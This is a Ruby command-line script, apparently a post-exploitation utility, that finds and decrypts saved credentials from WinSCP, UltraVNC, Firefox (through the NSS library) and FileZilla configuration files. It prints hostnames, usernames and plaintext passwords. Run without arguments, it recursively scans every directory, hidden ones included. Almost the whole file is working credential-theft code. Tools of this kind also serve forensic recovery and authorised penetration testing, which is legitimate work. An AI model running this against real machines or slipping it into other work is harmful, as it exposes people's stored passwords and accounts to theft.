#!/usr/bin/env ruby

require 'debug_utils'
require 'password_utils'
require 'sqlite3'
require 'optparse'
require 'ffi'
require 'json'
require 'nokogiri'

$debug = false




module Credentials

module NSS
  extend FFI::Library
  ffi_lib 'nss3'

  enum :secStatus, [
                    :secWouldBlock, -2,
                    :secFailure,
                    :secSuccess
                   ]

  enum :secItemType, [
                      :siBuffer, 0,
                      :siClearDataBuffer,
                      :siCipherDataBuffer,
                      :siDERCertBuffer,
                      :siEncodedCertBuffer,
                      :siDERNameBuffer,
                      :siEncodedNameBuffer,
                      :siAsciiNameString,
                      :siAsciiString,
                      :siDEROID,
                      :siUnsignedInteger,
                      :siUTCTime,
                      :siGeneralizedTime,
                      :siVisibleString,
                      :siUTF8String,
                      :siBMPString
                     ]

  class SECItem < FFI::Struct
    layout :type, :secItemType,
           :data, :pointer,
           :len,  :int
  end

  attach_function :NSS_Init, [ :string ], :int
  attach_function :NSS_Shutdown, [ ], :secStatus
  attach_function :PK11_GetInternalKeySlot, [ ], :pointer
  attach_function :PK11_CheckUserPassword, [ :pointer , :string ], :secStatus
  attach_function :PK11_Authenticate, [ :pointer, :int, :pointer ], :int
  attach_function :PK11SDR_Decrypt, [ :pointer, :pointer, :pointer ], :int
  attach_function :PK11_FreeSlot, [:pointer ], :int
end

module Decrypt

class Default

  def initialize()
    @files = []
  end

  def parse(input, type)

    case type
    when :file
      parse_file(input)
    when :dir
      parse_dir(input)
    when :directory
      parse_dir(input)
    when :string
      parse_string(input)
    end
  end

  def parse_dir(input)

    Dir.entries(input).each do |f|
      parse_file("#{input}/#{f}") if @files.include? f.downcase
    end

  end

  def parse_file(input)

    return unless File.exists? input
    return unless @files.include? File.basename(input).downcase

  end

  def parse_string(input)
  end

end


# Stolen from Ryan Fucking Lynn code
class WinSCP < Default

  def initialize()

    @files = [ "winscp.ini" ]

    @flag   = 0xFF
    @magic  = 0xA3
    @string = "0123456789ABCDEF"

  end


  def decrypt_next_char(pass)

    if pass.length > 0

      unpack1 = @string.index(pass[0,1])
      unpack1 = unpack1 << 4

      unpack2 = @string.index(pass[1,1])
      result= ~((unpack1+unpack2) ^ @magic) & 0xff
      pass = pass[2,pass.length]
      return [ result, pass ]
    end
  end

  def decrypt_password(user, pass, host)

    key = user + host
    flag, pass = decrypt_next_char(pass)

    if flag == @flag
      r, pass = decrypt_next_char(pass);
      length, pass = decrypt_next_char(pass);
    else
      length = flag;
    end

    ldel, pass = decrypt_next_char(pass) ;
    ldel = ldel * 2

    pass = pass[ ldel , pass.length ];
    result = "";

    for ss in 0...length
      r, pass = decrypt_next_char(pass)
      result += r.chr
    end

    if flag == @flag
      result = result[key.length,result.length];
    end

    return result
  end

  def parse_file(input)

    super
    credz = {
      :user => nil,
      :pass => nil,
      :host => nil
    }

    f = open(input, 'r')
    f.readlines.each do |line|

      line.strip!
      case line.downcase.split("=")[0]
      when "hostname"
        credz[:host] = line.split("=", 2)[1]
      when "username"
        credz[:user] = line.split("=", 2)[1]
      when "password"
        credz[:pass] = line.split("=", 2)[1]
      end

      if not credz[:user].nil?  and
          not credz[:pass].nil? and
          not credz[:host].nil?
        res = decrypt_password(credz[:user],
                               credz[:pass],
                               credz[:host])
        print_info "#{credz[:user]}@#{credz[:host]} => #{res} (#{input})"
        credz[:user] = nil
        credz[:pass] = nil
        credz[:host] = nil
      end

    end

  end

  def parse_dir(input)
    super
  end

end


class UVNC < Default

  def initialize()
    @files = [ "ultravnc.ini" ]
  end

  def parse_file(input)
    f = open(input, 'r')
    f.readlines.each do |line|
      if line.start_with? "passwd"
        parse_string(line.strip.split("=")[1][0..15])
      end
    end
  end

  def parse_string(input)
    print_info "#{Password::VNC.decrypt(input.unhex)} (#{input})"
  end

end

# Good read => http://www.infond.fr/2010/04/firefox-passwords-management-leaks.html
class Firefox < Default

  def initialize()
    @files = [ "logins.json", "signons.sqlite" ]
  end

  def decrypt(source, hostname, encryptedUsername, encryptedPassword)

    enc_username = NSS::SECItem.new
    enc_password = NSS::SECItem.new
    dec_username = NSS::SECItem.new
    dec_password = NSS::SECItem.new

    enc_username[:data] = FFI::MemoryPointer.from_string(encryptedUsername.base64_decode)
    enc_username[:len]  = encryptedUsername.base64_decode.length

    enc_password[:data] = FFI::MemoryPointer.from_string(encryptedPassword.base64_decode)
    enc_password[:len]  = encryptedPassword.base64_decode.length

    if NSS.PK11SDR_Decrypt(enc_username, dec_username, nil) == -1
      print_debug "PK11SDR_Decrypt failed for username"
    end

    if NSS.PK11SDR_Decrypt(enc_password, dec_password, nil) == -1
      print_debug "PK11SDR_Decrypt failed for password"
    end

    username = dec_username[:data].read_string()[0..dec_username[:len] -1]
    password = dec_password[:data].read_string()[0..dec_password[:len] -1]
    if $debug
      print_info "#{source} => #{hostname} -- #{username} -- #{password}"
    else
      print_info "#{hostname} -- #{username} -- #{password}"
    end

  end

  # def parse(input, type)
  #   unless type == :dir
  #     print_error "#{input} type (#{type}) is not 'dir'"
  #   end
  #
  # end

  def parse_file(input)

    super
    dir = File.dirname input

    unless NSS.NSS_Init(dir) == 0
      print_debug "Failed at reading #{dir}"
      return
    end

    keySlot = NSS.PK11_GetInternalKeySlot()
    NSS.PK11_CheckUserPassword(keySlot, "")
    NSS.PK11_Authenticate(keySlot, 1, nil)

    case File.basename(input).downcase
    when "signons.sqlite"

      print_debug "Extracting credz from #{input}"
      db = SQLite3::Database.new( input )
      ff_credz = db.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins ORDER BY hostname")

      begin
        ff_credz.each do |hostname, encryptedUsername, encryptedPassword|
          self.decrypt(input, hostname, encryptedUsername, encryptedPassword)
        end
      rescue
      end

      db.close

    when "logins.json"

      print_debug "Extracting credz from #{input}"
      db = File.open( input )
      json = JSON.parse( db.read )

      begin
        json["logins"].sort{|a,b| a["hostname"] <=> b["hostname"]}.each do |login|
          self.decrypt(input, login["hostname"], login["encryptedUsername"], login["encryptedPassword"])
        end
      rescue
      end

    else
      print_debug "#{input} called from the void"
      return
    end

    NSS.PK11_FreeSlot(keySlot)
    NSS.NSS_Shutdown()

  end

end

class FileZilla < Default

  def initialize()

    @files = [ "sitemanager.xml", "filezilla.xml" ]
    @credz = {
      :block => {
        "Settings/Setting" => {
          :host => "FTP Proxy host",
          :user => "FTP Proxy user",
          :pass => "FTP Proxy password"
        },
        "Settings/Item" => {
          :host => "Last Server Host",
          :user => "Last Server User",
          :pass => "Last Server Pass"
        },
      },
      :item => [ "RecentServers/Server", "Sites/Site" ]
    }

  end

  def parse_file(input)

    super
    case File.basename(input).downcase

    when "sitemanager.xml"
      f = File.open( input )
      xml = Nokogiri::XML( f )

      servers = xml.xpath("//FileZilla3/Servers/Server")
      servers.each do |server|

        host = server.xpath("Host").text
        port = server.xpath("Port").text
        user = server.xpath("User").text
        pass = server.xpath("Pass").text

        print_info "#{host}:#{port} => #{user} - #{pass}"

      end
      f.close

    when "filezilla.xml"
      f = File.open( input )
      xml = Nokogiri::XML( f )

      if xml.xpath("//FileZilla").length > 0
        version = "FileZilla"
      elsif xml.xpath("//FileZilla3").length > 0
        version = "FileZilla3"
      else
        f.close
        return
      end

      @credz[:block].each_key do |k|

        begin
          host = xml.xpath("//#{version}/#{k}[@name='#{@credz[:block][k][:host]}']")[0].text
          user = xml.xpath("//#{version}/#{k}[@name='#{@credz[:block][k][:user]}']")[0].text
          pass = xml.xpath("//#{version}/#{k}[@name='#{@credz[:block][k][:pass]}']")[0].text

          unless ( host.nil? or host.length == 0 ) and
              ( user.nil? or user.length == 0 ) and
              ( pass.nil? or pass.length == 0 )
            print_info "#{host} => #{user} - #{pass}"
          end

        rescue
        end

      end

      @credz[:item].each do |k|

        xml.xpath("//#{version}/#{k}").each do |item|

          host = item.attr("Host")
          user = item.attr("User")
          pass = item.attr("Pass")

          print_info "#{host} => #{user} - #{pass}"

        end

      end

      f.close

    end

  end

end

end

end

if $0 == __FILE__

  options = {}

  opts = OptionParser.new
  opts.banner = "Usage: #{$0} -f <format> -t <input-type> -i <input> [options]"

  opts.on("-f", "--format FORMAT", "The format to be read") do |f|
    case f.downcase
    when "uvnc"
      options[:format] = Credentials::Decrypt::UVNC
    when "ultravnc"
      options[:format] = Credentials::Decrypt::UVNC
    when "ff"
      options[:format] = Credentials::Decrypt::Firefox
    when "firefox"
      options[:format] = Credentials::Decrypt::Firefox
    when "filezilla"
      options[:format] = Credentials::Decrypt::FileZilla
    when "winscp"
      options[:format] = Credentials::Decrypt::WinSCP
    else
      print_error "Unknown format #{f}"
      puts opts.banner
      exit
    end
  end

  opts.on("-i", "--input INPUT", "The input would usually be some string(s) of file(s)") do |i|
    options[:input] = [] if options[:input].nil?
    if File.directory? i
      options[:input] += Dir.glob("./#{i}/**/")
    else
      options[:input] << i
    end
  end

  opts.on("-t", "--type TYPE", "Specify if input will be string(s) or file(s)") do |t|
    case t.downcase
    when "string"
      options[:type] = :string
    when "file"
      options[:type] = :file
    when "dir"
      options[:type] = :dir
    else
      print_error "Unknown type #{t}"
      puts opts.banner
      exit
    end
  end

  opts.on("-o", "--output OUTPUT", "The sqlite3 file you want to put the credz on") do |o|
    options[:output] = o
  end

  opts.on("-d", "--debug") do
    $debug = true
  end

  opts.parse!


  if options[:format]
    parsers = options[:format]
  else
    parsers = [
               Credentials::Decrypt::UVNC,
               Credentials::Decrypt::Firefox,
               Credentials::Decrypt::FileZilla,
               Credentials::Decrypt::WinSCP
              ]
  end

  if options[:input]
    targets = options[:input]
  else
    targets = Dir.glob("**/") + Dir.glob(".[a-zA-Z0-9]*/**/")
  end

  targets.each do |input|
    puts "Processing #{input}" if $debug
    parsers.each do |p|

      if options[:type]
        type = options[:type]
      else
        type = File.ftype(input).to_sym
      end

      parser = p.new
      parser.parse(input, type)
    end
  end


end
